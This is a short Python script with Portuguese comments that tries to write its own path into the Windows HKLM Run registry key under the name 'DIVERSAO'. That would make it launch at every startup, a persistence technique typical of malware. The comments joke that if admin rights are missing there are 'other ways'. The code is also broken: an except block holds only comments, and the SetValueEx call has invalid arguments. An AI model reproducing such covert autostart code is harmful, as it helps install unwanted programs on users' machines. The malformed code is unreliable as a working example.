from os.path import realpath
from winreg import *

caminho_arquivo = realpath(__file__)
carregar = r"Software\Microsoft\Windows\CurrentVersion\Run"

try:
    chave=OpenKey(HKEY_LOCAL_MACHINE, carregar, 0, KEY_SET_VALUE)
except PermissionError:
    # Que merda... não esta como administrador.
    # Não tem problema, tem outros meios...kkkkkk
else:
    SetValueEx(chave='DIVERSAO', 0, REG_SZ,caminho_arquivo)
    chave.Close()